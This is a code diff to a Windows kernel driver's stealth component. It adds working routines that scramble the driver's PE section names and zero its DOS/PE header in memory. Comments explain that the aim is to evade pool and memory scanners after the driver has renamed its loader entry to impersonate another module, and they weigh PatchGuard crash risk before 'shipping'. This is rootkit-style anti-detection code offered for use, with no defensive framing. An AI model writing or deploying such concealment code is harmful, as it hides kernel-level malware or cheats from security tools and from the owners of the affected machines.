@@ -16,6 +16,16 @@
  * on a 7700X) to serve as a donor, then overwrite our BaseDllName AND
  * FullDllName UNICODE_STRINGs with the donor's.
  *
+ * Pool-scanner evasion (after the rename): walk our own PE section headers
+ * through IMAGE_FIRST_SECTION and overwrite each 8-byte section name with
+ * random alphabetic bytes, then zero the DOS+PE header prefix. ORDER
+ * MATTERS: the section-name walk needs a valid e_lfanew, so section
+ * scramble runs BEFORE RtlZeroMemory(our_base, 0x400). PG caveat: third-
+ * party driver images are typically not individually hash-tracked, but a
+ * disposable VM pass is called for before shipping -- if our image lands
+ * in PG's hash set for a given build, modifying its mapped bytes trips a
+ * 0x109 the same way a PsLoadedModuleList unlink would.
+ *
  * Overwrite-all-fields rationale. The NT loader builds each
  * KLDR_DATA_TABLE_ENTRY's UNICODE_STRING{.Buffer, .Length, .MaximumLength}
  * atomically; any partial swap (e.g. overwriting Buffer while leaving
@@ -131,11 +141,63 @@ static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
     return FALSE;
 }
 
+/* Pool-scanner evasion. Called AFTER stealth_apply's rename-in-place. The
+ * rename hides us from NtQuerySystemInformation(SystemModuleInformation)
+ * but leaves PE magic bytes and canonical section names (.text, INIT,
+ * PAGE) in physical memory where a pool/physmem scanner can grep for
+ * them. Scrambling the section headers kills the .text/INIT/PAGE string
+ * signature; zeroing the DOS+PE header kills the MZ/PE\0\0 magic
+ * signature. The section-name walk MUST run before the header zero
+ * because IMAGE_FIRST_SECTION dereferences e_lfanew. */
+static void scramble_section_names(PVOID image_base) {
+    PIMAGE_DOS_HEADER dos;
+    PIMAGE_NT_HEADERS nt;
+    PIMAGE_SECTION_HEADER sec;
+    LARGE_INTEGER tc;
+    ULONG seed;
+    USHORT n, i;
+    int j;
+
+    if (!image_base) return;
+
+    dos = (PIMAGE_DOS_HEADER)image_base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    nt = (PIMAGE_NT_HEADERS)((PUCHAR)image_base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+
+    /* KeQueryTickCount writes 8 bytes through its pointer argument on
+     * modern WDK (ReadInterruptTickCount into a LARGE_INTEGER). Passing
+     * the address of a 4-byte ULONG would corrupt the stack; use a
+     * proper LARGE_INTEGER buffer and feed its LowPart into RtlRandomEx. */
+    KeQueryTickCount(&tc);
+    seed = tc.LowPart ^ (ULONG)(ULONG_PTR)image_base;
+
+    n = nt->FileHeader.NumberOfSections;
+    sec = IMAGE_FIRST_SECTION(nt);
+    for (i = 0; i < n; i++) {
+        RtlZeroMemory(sec[i].Name, IMAGE_SIZEOF_SHORT_NAME);
+        for (j = 0; j < IMAGE_SIZEOF_SHORT_NAME; j++) {
+            sec[i].Name[j] = (UCHAR)('A' + (RtlRandomEx(&seed) % 26));
+        }
+    }
+}
+
+/* Zero the DOS + PE header prefix (0x400 bytes covers the full DOS
+ * header, e_lfanew, NT headers, and section headers area). After this
+ * the MZ / PE\0\0 magic is gone. Must run AFTER scramble_section_names
+ * because IMAGE_FIRST_SECTION reads e_lfanew which this zero clobbers. */
+static void zero_pe_header(PVOID image_base) {
+    if (!image_base) return;
+    RtlZeroMemory(image_base, 0x400);
+}
+
 NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     PLIST_ENTRY head, cur;
     KIRQL irql;
     PKLDR_DATA_TABLE_ENTRY our_entry = NULL;
     PKLDR_DATA_TABLE_ENTRY donor = NULL;
+    PVOID our_base = NULL;
 
     /* Phase 1.5: g_stealth_lock is initialized ONCE in DriverEntry. The
      * previous `static KSPIN_LOCK dummy; KeInitializeSpinLock(&dummy)`
@@ -197,7 +259,22 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     our_entry->BaseDllName = donor->BaseDllName;
     our_entry->FullDllName = donor->FullDllName;
 
+    /* Capture our DllBase under the lock while the KLDR entry is still
+     * authoritative, for the pool-scanner-evasion pass below. */
+    our_base = our_entry->DllBase;
+
     KeReleaseSpinLock(&g_stealth_lock, irql);
+
+    /* Pool-scanner evasion. Order: section-name scramble first (walk
+     * e_lfanew to the section headers), THEN zero the DOS+PE header
+     * prefix (0x400 bytes). Reversing the two would clobber e_lfanew and
+     * leave the section-header walk reading wild memory. Done after the
+     * rename pass and outside g_stealth_lock because these writes target
+     * our OWN image, not the shared PsLoadedModuleList. */
+    if (our_base) {
+        scramble_section_names(our_base);
+        zero_pe_header(our_base);
+    }
 
     /* DriverObject fields.
      *
@@ -261,6 +338,15 @@ NTSTATUS stealth_revert(PDRIVER_OBJECT drv) {
         drv->DriverSection = g_saved_driver_section;
     }
 
-    CHAMBER_LOG("stealth reverted\n");
+    /* We intentionally do NOT un-scramble section names or restore the
+     * DOS+PE header. The driver is unloading in a few moments; the
+     * loader does not re-parse our section names during unload (it uses
+     * DriverSection which we restore above), and the image's memory
+     * pages are released to the pool/MmUnloadSystemImage path immediately
+     * after. Attempting to reconstruct the header would require stashing
+     * a 0x400-byte copy for the lifetime of the driver -- more pool
+     * footprint for no behavioral win. */
+    CHAMBER_LOG("stealth reverted (section-name scramble / PE zero not "
+                "restored; image is being unloaded)\n");
     return STATUS_SUCCESS;
 }
